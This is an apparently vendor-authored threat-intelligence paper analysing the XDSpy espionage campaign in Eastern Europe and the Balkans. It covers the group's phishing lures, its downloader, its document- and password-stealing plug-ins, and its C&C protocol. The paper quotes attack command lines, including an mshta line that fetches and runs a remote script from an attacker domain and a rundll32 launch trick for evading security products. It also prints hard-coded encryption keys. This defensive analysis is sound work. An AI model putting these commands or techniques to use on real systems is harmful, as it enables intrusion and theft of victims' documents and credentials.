It has attracted very little public attention, with the exception of an\nadvisory from the Belarusian CERT in February 2020. In the interim, the group compromised many government agencies\nand private companies in Eastern Europe and the Balkans.\n\nIn this paper, we present our analysis of this nine-year-long espionage campaign, active since 2011, but which apparently\nwent dark in February 2020.\n\nWith its primary purpose seemingly being cyber espionage, this group stole documents and other sensitive files, such as\nvictims’ mailboxes. These outcomes were achieved through the use of the XDSpy malware ecosystem, composed of at least\nseven components: XDDown, XDRecon, XDList, XDMonitor, XDUpload, XDLoc and XDPass. As our research has not\nuncovered links with any previously known APT groups, we have attributed this malware toolset to a previously unknown\ngroup.\n\nWe wish to extend our special thanks to Antti Tikkanen (from Google’s Threat Analysis Group) for the initial tip-off and his\nhelp during the investigation.\n\n**CAMPAIGN**\n\nOur research suggests that this group has been active since at least 2011. We noticed it went dark in February 2020, likely\nafter the Belarus CERT published an advisory [1]. However, we cannot exclude the possibility that it switched to a new\nmalware family or is working on a new campaign.\n\nTargets of the XDSpy group are located in Eastern Europe and the Balkans and are primarily government entities, including\nmilitaries, ministries of foreign affairs, and private companies. Figure 1 shows the location of known victims according to\n_ESET telemetry._\n\n_F igure 1: Map of XDSpy victims according to ESET telemetry (Belarus, Moldova, Russia, Serbia and Ukraine)._\n\nXDSpy malware is mostly dedicated to reconnaissance and document theft. It also monitors removable devices and exfiltrates\ninteresting documents from them. Surprisingly, XDSpy’s developers chose to hard code the full paths of the files to be\nexfiltrated directly into their stealer executables. Thus, we were able to determine some of the documents that were stolen:\n\n - Entire Microsoft Outlook mailboxes (OST and PST files)\n\n - Various documents (PDF, DOC, XLS, etc.) related to each compromised organization:\n\n    - Plane tickets, travel reservations\n\n    - Working documents (research, planning, meetings notes, etc.)\n\n    - CVs.\n\nWe also noticed XDSpy operators exfiltrate Google Chrome local data (the indexed DB contains data stored locally by a\nbrowser script) for a Ukrainian news agency’s website by uploading the following file:\n\n\n-----\n\nc:\\users\\admin\\appdata\\local\\google\\chrome\\user data\\default\\indexeddb\\https_www.ostro.o rg_0.\nindexeddb.leveldb\\current\n\nHowever, we believe this might have been a mistake due to the presence of the .ost string in this file path. The .ost file\nextension is generally used for Microsoft Outlook mailboxes. XDSpy also exfiltrated documents freely available on the\ninternet such as QuickStartGuide_SanDiskSecureAccessV2.0.pdf. This may indicate that not all exfiltration\nrequests are checked by a human operator but rather rely on an automated system.\n\n**ATTRIBUTION**\n\nAfter careful research, we were not able to link XDSpy to any publicly known APT group:\n\n - We did not find any code similarity with other malware families\n\n - We did not observe any overlap in the network infrastructure\n\n - We are not aware of another APT group targeting these specific countries and verticals.\n\nMoreover, the group has been active for more than nine years – so, had such an overlap existed, we believe that it would\nhave been noticed, and the group uncovered, a long time ago.\n\nEven though the various malware samples don’t show a high level of sophistication in their development, the campaign\nappears to be well run. Over the nine years of activity, the operators carefully and consistently removed artefacts that could\nhelp unmask the developers’ or operators’ origin. We found only one file path artefact; it was in a malicious PowerPoint\npresentation, but it doesn’t provide much information:\n\nC:\\Users\\D1C20~1.ZHU\\AppData\\Local\\Temp\\MicrosoftPowerPoint (2).js\n\nWe also extracted all the PE compilation timestamps from the 53 samples we discovered. Figure 2 shows the distribution of\ntime-of-day from these samples. We believe that the developers might be working in the UTC+2 or UTC+3 time zone,\nwhich is also the time zone of most of the targets. We also noticed they were only working from Monday to Friday,\nsuggesting a professional activity.\n\n_F igure 2: XDSpy’s work hours based on PE compilation timestamps._\n\n**TECHNICAL ANALYSIS**\n\n**Compromise vector**\n\nXDSpy operators mainly seem to use spear-phishing emails in order to compromise their targets. In fact, this is the only\ncompromise vector we are aware of. However, the emails tend to vary a bit: some contain an attachment while others\ncontain a link to a malicious file. The first layer of the malicious file or attachment is generally a ZIP archive.\n\nOn VirusTotal, we found an XDSpy spear-phishing email that contains a malicious ZIP attachment, as shown in Figure 3. It\nwas sent in August 2015 to an employee of minsvyaz.ru, the Russian Ministry of Digital Development, Communications\nand Mass Media.\n\n\n-----\n\n_Fi gure 3: Spear-phishing email (partially redacted)._\n\nThe email roughly translates to:\n\nSubject: The police Lost and Found department found your email address\n\nThe police Lost and Found department received a plastic file folder with photos and documents. Your emails were\nfound inside.\n\nPlease check some of the photos in the attachment. If you recognize them you need to contact the police.\n\nAll found articles are stored by the police for three months after receipt. For each day the owner will be charged\n10 rubles.\n\nTatiana Solomatina\n\nLost and Found warehouse employee\n\nMoscow Main Department of Internal Affairs\n\nInside the archive is a Microsoft PowerPoint presentation in the PPSX format, as shown in Figure 4, which is automatically\ndisplayed in full-screen mode once opened. The first slide is a photograph of a fire safety certificate.\n\n_Fig ure 4: First slide of the malicious PowerPoint presentation._\n\n\n-----\n\n_Figu re 5: Warning from Microsoft PowerPoint when the malicious script is executed._\n\nIf the victim allows it, by clicking on ‘Open’ as shown in Figure 5, a malicious script called MicrosoftPowerPoint.js\nis executed. It will check for network connectivity by making an HTTP GET request to www.yahoo.com. It checks if the\nreturned page contains the string imgsrwe4 (for which we didn’t find any reference) and if not, it drops XDDown, the\nXDSpy orchestrator, at a hard-coded location. In this case, the hard-coded path is %APPDATA%\\WINinit\\WINlogon.exe.\n\nContinuing, the script also sets up persistence for the XDDown component by adding an entry in the Windows Run registry\nkey at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wininit. Finally, XDDown is executed.\n\nIn 2019 and 2020, we noticed that XDSpy was also sending emails without attachments but with a link, as seen in Figure 6.\n\n_Figur e 6: Spear-phishing email sent by XDSpy’s operators in February 2020._\n\nRoughly translated, the body of the email says:\n\nGood afternoon!\n\nI am sending you a copy of the letter and photo materials based on the results of the work. Click on the link\nto download: photo materials_11.02.2020.zip\n\nWe are waiting for an answer until the end of the working day.\n\nThe URL in the email body contains what appears to be a UUID, to download an archive. The malicious URL (for instance\nhttps://filedownload[.]email/filedownload/download.php?u=<uuid>) was delivering a piece of JavaScript\ncode that prompts for a file download. If accepted, a ZIP archive whose name is the same as the one displayed in the\nspear-phishing email is downloaded.\n\nSince December 2019, the operators have also used the domain downloadsprimary[.]com in a similar fashion.\n\nThis ZIP archive only contains an LNK file, without any decoy document. When the victim double-clicks on it, the LNK\nexecutes the following command line:\n\nC:\\Windows\\system32\\mshta.exe \"javascript:document.write();GetObject(\"script: https://\nfiledownload[.]email/filedownload/download2.php?f=<UUID>\")\"\n\nWe were not able to retrieve the script delivered by this URL but we did see that the result was XDDown being dropped\nand executed on the victim’s machine.\n\nIn February 2020, the XDSpy operators also apparently used spear-phishing emails related to the COVID-19 pandemic. On\n_Facebook [2], we found a photo of a printed email that is linked to the group in the Belarusian CERT advisory [1] via the_\naddress it was sent from – niipulm@tut[.]by. This email address belongs to the Belarusian Republican Scientific and\nPractical Center for Pulmonology and Tuberculosis [1].\n\nBecause the email says that the first cases of coronavirus were confirmed in Belarus a few weeks before the first official\ncase was actually registered, this photo has been shared multiple times on various social networks while it was really an\n\n\n-----\n\nXDSpy spear-phishing email containing a link to a piece of malware. The printed email, shown in Figure 7, apparently\ntargeted the Belarusian Ministry of Industry. This misinformation was debunked by tut.by, a Belarusian news website [3].\n\n_Figure 7: Spear-phishing email with COVID-19 hook._\n\n**XDDown: the orchestrator[1]**\n\nXDDown is the main malware component in the XDSpy toolset, and it manages the various plug-ins responsible for all\nother functionality. The oldest sample we have found was submitted to VirusTotal in August 2011[2]. It was apparently\ncompiled in July 2011 while the most recent samples were compiled and distributed at the beginning of 2020. Both 32- and\n64-bit variants exist in the wild. Figure 8 summarizes the various components used in this campaign.\n\n_Figure 8: XDSpy’s malware architecture._\n\n1 SHA-256: 02A7C7DF31B0A93FC80B053E46DCFA1EEB82EFF79C1C8D802DB31F1D0DB823FD\n2 SHA-256: 1529A6791DA28A19F306D008B5DD13AA0341C7586B0B8B056DB7F9E3C79B31C1\n\n\n-----\n\n**_Persistence_**\n\nAs we previously mentioned, XDDown persists using a very standard mechanism: a Windows registry Run key\n(HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\).\n\nInterestingly, in some cases, the XDDown binary was not executed directly. A trick was used with the Windows utility\navpack.dll [4], probably to try to fool EDR or other security products. For example, we have seen XDDown launched\nusing the following command line:\n\nC:\\Windows\\System32\\rundll32.exe advpack.dll, RegisterOCX \"c:\\windows\\system32\\SndVol.\nexe\\..\\..\\..\\Users\\admin\\AppData\\Local\\Temp\\Usermode COM Manager.exe\"\n\n**_Capabilities_**\n\nXDDown is nothing but a downloader – hence our chosen name. This architecture choice is quite different from what we\nsee in other APT malware frameworks, which tend to be quite complex with a whole set of backdoor commands and a\nlogging mechanism. On one hand, the XDSpy approach is easier to develop but, on the other hand, it is much less flexible\nfor the operators as a new binary needs to be built, downloaded and executed to perform any action on the compromised\nmachine.\n\n**_Network_**\n\nXDDown makes regular GET requests to its hard-coded command-and-control (C&C) URL to download its plug-ins,\nwhich are Windows DLLs. The payloads are divided into three chunks, so three consecutive GET requests are performed. A\nvery distinctive artefact is that the filename extension in these requests is .xd<i>, where <i> ranges from 1 to 3 or from 4\nfor 6. In fact, this provides the basis of the name we chose for the APT group using this malware: XDSpy.\n\nSo, for example, the following URLs will be requested:\n\n - http://officeupdtcentr[.]com/2officeupdate/data/<ID>.xd1?dbx=<GetTickCount value>\n\n - http://officeupdtcentr[.]com/2officeupdate/data/<ID>.xd2?dbx=<GetTickCount value>\n\n - http://officeupdtcentr[.]com/2officeupdate/data/<ID>.xd3?dbx=<GetTickCount value>\n\nThen, the three chunks of data received in response are concatenated and decrypted using a two-byte XOR key. From 2011\nto 2018, the XOR key was 0x16 0x11 and was changed to 0x31 0x73 in 2019. In the most recent samples, the buffer is\nthen dropped into the file %APPDATA%\\Temp.NET\\archset.dat (hard coded). Finally, it calls the versionValidation\nexport of the plug-in using the functions LoadLibrary and GetProcAddress. Older variants of XDDown embedded a\nPE loader, but the most recent versions simply rely on these Windows APIs.\n\nThe ID, contained in the C&C URL, is generated from the computer name, the username, the initial GetTickCount value\nand XDDown’s internal version. It uses a Caesar substitution cipher with a right shift of 1 so, for example, admin is\nencoded into benjo. The final ID is made up of these four shifted values separated by underscores. In the samples we\nanalysed, the version value ranged from V1 to V7 and, in the latest version, which we believe is 12, the version string is just\nC (12 in hexadecimal representation).\n\nEven if the User-Agent is hard coded, the XDSpy developers are apparently using actual, real-world values. For instance,\nthe latest versions use the following User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36.\n\n**_Evolution_**\n\nWe have noticed only minor modifications in the samples between 2011 and 2020. The hard-coded filenames have\nchanged, but the network protocol remains essentially the same. In 2013, some string obfuscation started to be added by\nfirst using string-stacking and then also shifting the characters with various offsets. Finally, most of the Windows API\nfunctions are resolved dynamically, probably in order to try to thwart detections.\n\n**Document stealers**\n\nDocument stealer plug-ins are downloaded, dropped in %APPDATA%\\Temp.NET\\archset.dat (this path might be\ndifferent in other samples), and loaded by XDDown. They all are Windows DLLs with a single export named\nversionValidation.\n\nThere is no persistence for any plug-ins, so they need to be re-downloaded every time the user logs in. The samples are\napparently compiled just before delivery and the XDSpy operators seem to add and remove code on the fly. This is\nnecessitated by the absence of backdoor commands, as all malicious actions must be hard coded in a plug-in.\n\nMost document stealer plug-ins have a kill switch. They exit if the current system time is after some hard-coded limit – for\nexample, November 2020, as shown in Figure 9.\n\n\n-----\n\n_Figure 9: Kill switch if the hard-coded date has passed._\n\nWe were able to distinguish four main types of stealer plug-ins that are generally executed in the same order as listed\nbelow. They all communicate with the C&C server using the HTTP protocol.\n\n**_XDRecon[3]_**\n\nThis is the most basic type of stealer plug-in. It gathers basic information about the victim machines (computer name,\nusername, volume serial number) and writes it in %APPDATA%\\Temp.NET\\hdir.dat. It uploads this file to the C&C\nserver and finally deletes it before exiting.\n\n**_XDList_**\n\nXDList gathers information about the computers’ files. It starts by recursive enumeration of all files on the C: drive, then\nwrites the path of ‘interesting’ files to %APPDATA%\\Temp.NET\\list.dat. Some folders, such as Program Files, Windows,\nTemp or Temporary Internet Files, are not crawled, probably in order to reduce the number of files reported. Table 1 lists\nthe file extensions that this plug-in deems interesting.\n\n**File extension** **Description – related software**\n.accdb\nMicrosoft Access\n.mdb\n.doc\n\n.docm Microsoft Word\n.docx\n.xls\n\n.xlm\nMicrosoft Excel\n.xlsx\n.xlsm\n\n.odt OpenDocument Text\n.ppt\n\n.pptm\n.ppsm Microsoft PowerPoint\n.pptx\n.sldm\n.ost\n\n.pst\nMicrosoft Outlook (mailboxes/emails)\n.msg\n.eml\n\n.pdf Portable Document Format\n\n.wab Windows Address Book\n\n_Table 1: Extensions reported by XDList._\n\n3 SHA-256: EECC34C52ECC1A46AB63BA0F9948ECC367C15850BCEF0ED55987EEF9BFEE077B\n\n|File extension|Description – related software|\n|---|---|\n|.accdb|Microsoft Access|\n|.mdb||\n|.doc|Microsoft Word|\n|.docm||\n|.docx||\n|.xls|Microsoft Excel|\n|.xlm||\n|.xlsx||\n|.xlsm||\n|.odt|OpenDocument Text|\n|.ppt|Microsoft PowerPoint|\n|.pptm||\n|.ppsm||\n|.pptx||\n|.sldm||\n|.ost|Microsoft Outlook (mailboxes/emails)|\n|.pst||\n|.msg||\n|.eml||\n|.pdf|Portable Document Format|\n|.wab|Windows Address Book|\n\n\n-----\n\nIt will also exclude files for which the filename contains one of these substrings: .lnk, .wab~, ~, winword.doc,\nwinword2.doc, license, or eula. Once the crawl is finished, the list of interesting files is sent to the hard-coded C&C\nserver.\n\nFinally, it will report some more information to the C&C server:\n\n - The list of connected drives (name, filesystem type and available space)\n\n - The uptime of the machine\n\n - A listing of the malware working directory (%APPDATA%\\Temp.NET\\)\n\n - A screenshot taken using the CreateCompatibleBitmap API function. It is RC4-encrypted (the hard-coded key is\nEh44UIu39c0s) and zipped before being sent to the C&C server.\n\n**_XDMonitor_**\n\nXDMonitor is intended to monitor the machine’s activity. It monitors when removable drives are inserted by creating a new\nhidden window and registering it for device notification (using RegisterDeviceNotificationW and the GUID GUID_\nDEVINTERFACE_DISK). When a new drive is inserted, it crawls it recursively. When a file with an interesting extension (the\nsame list as for XDList) is found, it encrypts it using RC4 (the hard-coded key is 1234123412341234) and uploads it to\nthe C&C server.\n\nIt also takes a screenshot every minute. Unlike the screenshots taken by XDList, the image is not encrypted and is stored in\n%TEMP%\\tmp%YEAR%%MONTH%%DAY%_%TICK_COUNT%.s. The screenshot is uploaded to the C&C immediately after being\ntaken.\n\nFinally, XDMonitor sends regular debug messages to the C&C server, as shown in Figure 10.\n\n_F igure 10: Regular log messages sent to the C&C server._\n\nIt also sends regular POST requests to officeupdtcent[.]com/2officeupdate/data/%ID%.xd1 and\nofficeupdtcentr.com/2officeupdate/data/%ID%.xd4. If the server replies with a 404 code, the malware process\nstops the monitoring and exits.\n\nIt is interesting to note that some of the URLs hard coded in this plug-in (like the two we have just mentioned) contain the\nID generated per machine. This means the plug-ins are specifically compiled for each different compromised machine.\n\n**_XDUpload[4]_**\n\nLike XDMonitor, XDUpload monitors removable drives and takes regular screenshots. The additional feature is that it will\ncollect a list of files that are hard coded in the binary, as shown in Figure 11, and then upload the list to the C&C server. It\nuses %TEMP%\\fl637136486220077590.data to keep track of how many files from the static list have been uploaded.\n\nWe believe that the operators are checking the list of files from the C: drive, sent by XDList, and then selecting the ones\nthat seem most interesting to them for exfiltration. What is surprising is that the paths are directly hard coded in the samples\nand not retrieved dynamically by a request to the C&C server. Thus, to collect additional files, the operators need to modify\ntheir source code, recompile and drop a new version of the plug-in on the victim’s machine.\n\n4 SHA-256: CD28B921B4F4C736E80C817EE7290264E6BBA026E78C1AA87F349959E897F184\n\n\n-----\n\n_Fi gure 11: Loop uploading a hard-coded list of files to the C&C server (partially redacted)._\n\n**_Network_**\n\nAll communications with the C&C server use HTTP and the URLs are hard coded in the binaries. Table 2 is a summary of\nthe different URLs used by the plug-ins.\n\n**URL** **User-Agent** **Description**\n\nhttp://<C&C>/lup.php?name=<ID> / Upload files and screenshots\n\nMozilla/5.0 (Windows NT 6.1;\n\nUpload the files\n\nWOW64) AppleWebKit/537.36\n\nhttp://<C&C>/tf.php (hex-encoded) containing\n\n(KHTML, like Gecko)\n\nthe directory listing\n\nChrome/45.0.2454.93 Safari/537.36\n\nhttp://<C&C>/data/<ID>.xd1 Exit the monitoring mode\nInternet Explorer\nhttp://<C&C>/data/<ID>.xd4 when it returns a 404 code\n\nhttp://<C&C>/tl.php?me=<ID>&info=bot, file Report progress of static file\nInternet Explorer\n%d of %d (%d %) upload loop (XDUpload)\n\nNotify server that the\nhttp://<C&C>/tl.php?me=<ID>&info=bot, scr Internet Explorer\nscreenshot loop is running\n\nMozilla/5.0 (Windows NT 6.1;\n\nhttp://<C&C>/tdb.php?usid=<ID>&txt=<LOG_ WOW64) AppleWebKit/537.36 Debug log messages\nTEXT> (KHTML, like Gecko) (XDMonitor)\n\nChrome/45.0.2454.93 Safari/537.36\n\n_Ta ble 2: C&C URLs used by the plug-ins._\n\nPrevious versions of the malware used another quite distinctive URL: http://<C&C>/ whowhat.php?me=<userid>.\n\n**Other plug-ins and tools**\n\nFurther to the document stealers we have just described, we have seen the operator deploy a few additional tools.\n\nAlthough our telemetry data shows these tools deployed by XDSpy operators to their victims, it is unclear how these\nexecutables are run on the targeted machines. We suspect that another plug-in, or versions of an existing one with additional\nfunctionality compiled in for just this purpose, is involved, but has not been identified yet.\n\n|URL|User-Agent|Description|\n|---|---|---|\n|http://<C&C>/lup.php?name=<ID>|/|Upload files and screenshots|\n|http://<C&C>/tf.php|Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36|Upload the files (hex-encoded) containing the directory listing|\n|http://<C&C>/data/<ID>.xd1 http://<C&C>/data/<ID>.xd4|Internet Explorer|Exit the monitoring mode when it returns a 404 code|\n|http://<C&C>/tl.php?me=<ID>&info=bot, file %d of %d (%d %)|Internet Explorer|Report progress of static file upload loop (XDUpload)|\n|http://<C&C>/tl.php?me=<ID>&info=bot, scr|Internet Explorer|Notify server that the screenshot loop is running|\n|http://<C&C>/tdb.php?usid=<ID>&txt=<LOG_ TEXT>|Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36|Debug log messages (XDMonitor)|\n\n\n-----\n\n**_XDLoc[5]_**\n\nXDLoc is a location discovery plug-in that retrieves a list of nearby Wi-Fi access points. It uses the\nWlanGetNetworkBssList _Windows API function to retrieve the list of nearby BSSIDs and their signal strengths (RSSI)._\nThis information is then written in <CURRENT_DIRECTORY>\\wgl.dat.\n\nWe believe that this information can be combined with databases of geolocation of known Wi-Fi access points in order to\napproximate the location of the victim’s device.\n\n**_XDPass[6]_**\n\nXDPass is a quite standard browser password stealer, and it has similar custom obfuscation to the other plug-ins. It can\nrecover passwords from Internet Explorer, Chrome and Opera. We did not see significant code similarity with known\npassword stealers, but we cannot exclude that it might be based on some generic code.\n\n**_NirSoft_**\n\nWe also see a wide range of NirSoft [2] tools being deployed, most of them used to grab passwords from various\napplications. We have seen the following tools:\n\n - ChromePass\n\n - PassFox\n\n - IEPassView\n\n - MailPassView\n\n - NetPass\n\n - Protected Storage PassView\n\n - OperaPassView.\n\n**CONCLUSION**\n\nXDSpy has flown under the radar for almost nine years while conducting cyber espionage operations against governments\nand private companies in Eastern Europe and the Balkans. The group focuses on the exfiltration of documents stored on the\nvictims’ machines and on removable drives.\n\nThe various pieces of malware are relatively simple and don’t show the use of advanced techniques, yet are effective. It\nwould be interesting to know if the development choices, such as hard coding file paths in XDUpload, were informed\ndecisions or if they show a lack of malware development skills.\n\n**REFERENCES**\n\n[1] Belarusian Republican Scientific and Practical Center for Pulmonology and Tuberculosis. http://www.rnpcpf.by/en/\ncontacts.html.\n\n[2] NirSoft. https://www.nirsoft.net/.\n\n[3] CERT.by.
